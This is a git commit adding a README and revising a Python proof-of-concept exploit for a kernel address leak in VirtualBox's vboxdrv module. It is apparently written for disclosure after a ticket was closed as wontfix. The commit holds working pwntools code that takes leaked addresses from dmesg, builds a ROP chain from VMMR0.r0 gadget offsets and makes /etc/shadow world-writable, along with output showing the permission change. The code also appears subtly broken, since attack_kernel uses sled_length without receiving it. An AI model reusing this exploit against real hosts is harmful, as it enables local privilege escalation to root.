8a8ec3b2266bbf5fda738720f82981078e165fb3
John Andersen <johnandersenpdx@gmail.com>
2016-09-01 00:52:40 -0700

    Wrote README.md and fixed userspace attack
    Signed-off-by: John Andersen <johnandersenpdx@gmail.com>

---
+++ README.md
@@ -0,0 +1,118 @@
+# VirtualBox Kernel Address Leak POC
+
+This is in response to a ticket filed by Robert C. Williams (wcrobert)
+Here is the ticket: https://www.virtualbox.org/ticket/15167
+
+Below is the ticket before we started work on our POC. Reproduced here for the
+sake of completeness.
+
+### Kernel Address Info Leak
+
+##### Description
+
+I reported this via secalert_us@… and was told to resubmit here:
+
+vbox kernel module seems to printk kernel addresses that get picked up by
+syslog. This information could be used by someone who has gained uid/gid syslog
+adm (On Ubuntu) to successfully chain an attack to kernel data structures (thus
+defeating ASLR). Information from /proc/modules is sanitized for non-root
+users.
+
+The requested fix is to stop printing out kernel addresses.
+
+Host $ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu
+Description: Ubuntu 14.04.4 LTS Release: 14.04 Codename: trusty
+
+$uname -a Linux wcrobert-MOBL1 3.19.0-18-generic #18~14.04.1-Ubuntu SMP Wed May
+20 09:38:33 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+
+VBox Version: Version 5.0.14 r105127
+
+What I found in syslog:
+
+```log
+Feb 11 11:27:57 wcrobert-MOBL1 kernel: [    5.881847] vboxdrv: Found 4 processor cores
+Feb 11 11:27:57 wcrobert-MOBL1 kernel: [    5.901307] vboxdrv: TSC mode is Invariant, tentative frequency 2593993759 Hz
+Feb 11 11:27:57 wcrobert-MOBL1 kernel: [    5.901310] vboxdrv: Successfully loaded version 5.0.14 (interface 0x00240000)
+Feb 11 11:27:57 wcrobert-MOBL1 kernel: [    6.112417] vboxpci: IOMMU not found (not registered)
+Feb 11 12:16:23 wcrobert-MOBL1 kernel: [ 2913.482380] vboxdrv: ffffffffc0000020 VMMR0.r0
+Feb 11 12:16:23 wcrobert-MOBL1 kernel: [ 2913.571393] vboxdrv: ffffffffc00fa020 VBoxDDR0.r0
+Feb 11 12:16:23 wcrobert-MOBL1 kernel: [ 2913.572892] vboxdrv: ffffffffc0119020 VBoxDD2R0.r0
+Feb 11 12:16:23 wcrobert-MOBL1 kernel: [ 2913.606759] vboxdrv: ffffffffc011d020 VBoxEhciR0.r0
+```
+
+##### Response from frank:
+
+- Status changed from new to closed
+- Resolution set to wontfix
+
+Sorry, this is NOT a security problem and not a problem at all. Having these
+addresses is not a problem because special permissions are required to make use
+of them.
+
+## Why POC?
+
+This is a security issue because the leaking of kernel addresses allows an
+attacker to defeat KASLR.
+
+KASLR (Kernel Address Space Layout Randomisation) makes it so that if you find
+an exploitable vulnerability in anything running in ring 0 (for example a
+driver) you are unable to use standard techniques such as ROP to gain code
+execution because you don't know where any of the gadgets you need to use are.
+
+When something running in ring 0 leaks addresses, which is what VirtualBox is
+doing, the attacker now knows where they gadgets they need are located and thus
+can execute whatever code they want at the highest level of privilege.
+
+We believed it was necessary to create a POC for this because by leaking
+kernel addresses VirtualBox allows attackers to gain the highest level of
+execution privilege on a system.
+
+## What does your POC do?
+
+Our POC uses the addresses that VirtualBox leaks to `dmesg` to construct a ROP
+chain which makes /etc/shadow world writeable. This then allows an attacker
+with the lowest level of permissions to change the root password on the system
+thus owning it.
+
+## How does your POC do that?
+
+Our POC grabs the leaked addresses from `dmesg` and constructs a ROP chain that
+points to gadgets in `VMMR0.0`. We created a extremely basic kernel module which
+experiences a stack buffer overflow. The module init calls the vulnerable
+function which `memcpy`'s into a buffer on the stack. The ROP chain is
+prepended with the address of a `retq` which creates a ret slide into the
+functional part of our payload.
+
+The exploit now builds a string in the `.bss` section of the `VMMR0.r0` driver.
+The string, `/etc/shadow`, is then passed to the `chmod` function and `syscall`
+is invoked.
+
+> Following the `syscall` instruction are NULL bytes which rip is set to and
+> `dmesg` reports that the module hit an invalid instruction. This is okay
+> because we still changed the permissions on the file so we've succeeded in
+> escalating our privileges.
+
+## Running For Yourself
+
+You need to have python3.5 and python3-pwntools installed (you must be on the
+`rop_load_add_register_to_stack` branch in pdxjohnny's fork or wait for it to
+be merged into master).
+
+```log
+$ ls -lAf /etc/shadow
+-rw------- 1 root root 806 Aug 29 17:12 /etc/shadow
+$ ./poc.py kernel VMMR0.r0 payload
+$ ls -lAf /etc/shadow
+-rw-rw-rw- 1 root root 806 Aug 29 17:12 /etc/shadow
+```
+
+## Impact
+
+This affects VirtualBox version 5.0.14 and beyond so far was we know. Perhaps
+earlier versions as well.
+
+## Recommendations
+
+We *strongly* recommend that VirtualBox be patched so that it does not log the
+addresses of its modules.
--- poc.py
+++ poc.py
@@ -1,59 +1,72 @@
 #!/usr/bin/env python3.5
-import sys
-from pwn import *
-context.clear(arch='amd64', kernel='amd64')
+#
+# vbox_poc.py - Exploit VirtualBox leakage of kernel address space
+#
+# Copyright (c) 2016, Intel Corporation
+#
+# Redistribution and use in source and binary forms, with or without
+# modification, are permitted provided that the following conditions are met:
+#
+#    * Redistributions of source code must retain the above copyright notice,
+#      this list of conditions and the following disclaimer.
+#    * Redistributions in binary form must reproduce the above copyright
+#      notice, this list of conditions and the following disclaimer in the
+#      documentation and/or other materials provided with the distribution.
+#    * Neither the name of Intel Corporation nor the names of its contributors
+#      may be used to endorse or promote products derived from this software
+#      without specific prior written permission.
+#
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE
+# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '''
+
+
+
+
+
 gcc -g -D OF_SIZE=128 userspace.c -o userspace
 python3 ./poc.py VMMR0.r0 payload 100
 
-gdb -tui userspace
-b userspace.c:90
-r VMMR0.r0 payload
-
-Now in other window
-./poc.py VMMR0.r0 payload 30 0x7ffff78da000
-Then ctrl-d in gdb so userspace will continue
-
-s
-si
-x/64x $rsp
-si
+Open another shell session and run this
+rm /tmp/shadow && touch /tmp/shadow && watch -n 0.2 ls -lAF /tmp/shadow
+Now run the poc
+./poc.py userspace VMMR0.r0 payload 30 0x7ffff78da000
 
 VMMR0:  http://www.ropshell.com/ropsearch?h=f81f7bdd9ffe47e093805c9d2f626f38
 pop rdi; ret;                       VMMR0 + 0x07b62a
 pop rax; ret;                       VMMR0 + 0x01f7bd
-
-
-
-mov rax, [rdi + 0x2a50]; ret;       VMMR0 + 0x0b7470
-
-THIS DOES NOT STORE TO MEMORY!!! ^ THIS TAKES RDI+0X0A50 AND
-STORES WHAT IS IN MEMORY THERE INTO RAX
-
-WHAT WE NEED IS
-mov [rdi], rax
-
-WHICH IN x64 IS
-0:  48 89 07                mov    QWORD PTR [rdi],rax
-
-mov    %rax,(%rdi)                  VMMR0 + 0x081643
-
-
+mov rax,(rdi)                       VMMR0 + 0x081643
 syscall; ret;                       VMMR0 + 0x012c3c0
 push rsp; ret;                      VMMR0 + 0x01f7ad
 pop rbp; ret;                       VMMR0 + 0x028d
 xor eax, eax; ret;                  VMMR0 + 0x08b8
 retq;                               VMMR0 + 0x01ea33
 '''
+import sys
+from pwn import *
 
 # For some insane reason (probably due to how ELF works) when we load the
 # target_binary into memory in userspace.c everything is 0x40 above where it
 # normally is. Therefore we use some addition to fix that.
 class Adjuster(object):
     def __init__(self, offset):
+        '''
+        Specify an offset to be used for adjustment
+        '''
         self.offset = offset
 
     def __call__(self, addr):
+        '''
+        Return the addr + the offset specified on creation
+        '''
         return self.offset + addr
 adjuster = Adjuster(0x00)
 
@@ -61,30 +74,29 @@ adjuster = Adjuster(0x00)
 def leaked(start_leaker, search_for):
     # Get the address from the leak
     leaker = process(start_leaker)
-    leak = leaker.recvall().decode('utf-8').replace('\r', '')
-    leak = [l for l in leak.split('\n') if 'vboxdrv:' in l and search_for in l]
-    if len(leak) < 1:
-        return
-    leak = leak[-1].split()
-    if len(leak) < 3:
-        return
-    leak = int(leak[-2], 16)
+    leak = ''
+    while not isinstance(leak, int):
+        leak = leaker.recv().decode('utf-8').replace('\r', '')
+        leak = [l for l in leak.split('\n') if 'vboxdrv:' in l and search_for in l]
+        if len(leak) < 1:
+            return
+        leak = leak[-1].split()
+        if len(leak) < 3:
+            return
+        leak = int(leak[-2], 16)
     return leak, leaker
 
-def build(leak, gadget_file):
+def build(leak, gadget_file, sled_length):
     # Load the target binary
     with open(gadget_file, 'rb') as i:
         binary = ELF.from_bytes(i.read(), vma=leak)
     # Create the ROP stack
     rop = ROP(binary)
 
-    # Push a valid rbp
-    rop.raw(0x7fffffffff00)
-
     # Put a nice lil ret seld on der
-    # for i in range(0):
-    #     # ret;
-    #     rop.raw(adjuster(leak + 0x01ea33))
+    for i in range(0, sled_length):
+        # ret;
+        rop.raw(adjuster(leak + 0x01ea33))
 
     # Build a string in the .bss section of the target driver
     # the .bss section starts at the address the driver was loaded
@@ -145,16 +157,15 @@ def build(leak, gadget_file):
     # Display our completed ROP chain
     print(rop.dump())
     # Return it as bytes to be writen out
-    # Put 132 bytes of whatever
-    return b'A'*128 + bytes(rop)
+    return bytes(rop)
 
-def create_exploit(target_binary, payload_file, leak):
-    exploit = build(leak, target_binary)
+def create_exploit(target_binary, payload_file, sled_length, leak):
+    exploit = build(leak, target_binary, sled_length)
     with open(payload_file, 'wb') as o:
         o.write(exploit)
     return exploit
 
-def attack_userspace(target_binary, payload_file):
+def attack_userspace(target_binary, payload_file, sled_length):
     # For ELF offset
     global adjuster
     adjuster = Adjuster(0x40)
@@ -162,7 +173,7 @@ def attack_userspace(target_binary, payload_file):
     leak, leaker = leaked(['./userspace', target_binary, payload_file],
             target_binary)
     print('Leaked address is', str(hex(leak)))
-    exploit = create_exploit(target_binary, payload_file, leak)
+    exploit = create_exploit(target_binary, payload_file, sled_length, leak)
     leaker.shutdown('send')
     leaker.shutdown()
 
@@ -170,7 +181,7 @@ def attack_kernel(target_binary, payload_file):
     leak, leaker = leaked(['dmesg', '--color=never'], target_binary)
     leaker.shutdown()
     print('Leaked address is', str(hex(leak)))
-    exploit = create_exploit(target_binary, payload_file, leak)
+    exploit = create_exploit(target_binary, payload_file, sled_length, leak)
     exploit_length = len(exploit)
     exploit = bytes(exploit).hex()
     args = ['sudo', 'insmod', 'vbox3.ko', 'exploit_payload="'+exploit+'"',
@@ -179,6 +190,8 @@ def attack_kernel(target_binary, payload_file):
     print(process(args).recvall())
 
 def main():
+    # Set the pwntools context
+    context.clear(arch='amd64', kernel='amd64')
     # Make sure we have enough args
     if len(sys.argv) < 4:
         print('Usage %s attack_method target_binary payload_file [leak]'.format(sys.argv[1]))
@@ -187,15 +200,16 @@ def main():
     attack_method = sys.argv[1]
     target_binary = sys.argv[2]
     payload_file = sys.argv[3]
+    sled_length = int(sys.argv[4])
     # Choose what to do baised on number of vars given
-    if len(sys.argv) == 4:
+    if len(sys.argv) == 5:
         if attack_method == 'userspace':
-            attack_userspace(target_binary, payload_file)
+            attack_userspace(target_binary, payload_file, sled_length)
         elif attack_method == 'kernel':
-            attack_kernel(target_binary, payload_file)
+            attack_kernel(target_binary, payload_file, sled_length)
     else:
-        leak = int(sys.argv[4], 16)
-        create_exploit(target_binary, payload_file, leak)
+        leak = int(sys.argv[5], 16)
+        create_exploit(target_binary, payload_file, sled_length, leak)
 
 if __name__ == '__main__':
     main()
